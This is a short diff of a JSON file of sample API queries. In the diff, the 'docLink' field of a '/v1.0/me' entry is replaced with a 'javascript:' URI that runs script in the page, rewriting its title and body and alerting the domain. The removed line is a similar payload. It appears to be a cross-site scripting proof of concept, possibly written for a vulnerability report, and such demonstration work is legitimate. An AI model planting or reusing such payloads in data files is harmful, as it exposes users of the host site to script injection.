@@ -6,7 +6,7 @@
       "method": "GET",
       "humanName": "my profile",
       "requestUrl": "/v1.0/me",
-      "docLink": "javascript:localStorage.setItem('msrc_xss_executed',document.domain);document.body.textContent='XSS: '+document.domain;alert(document.domain);void 0",
+      "docLink": "javascript:document.title=document.domain;document.body.textContent=document.domain;alert(document.domain)",
       "skipTest": false
     },
     {
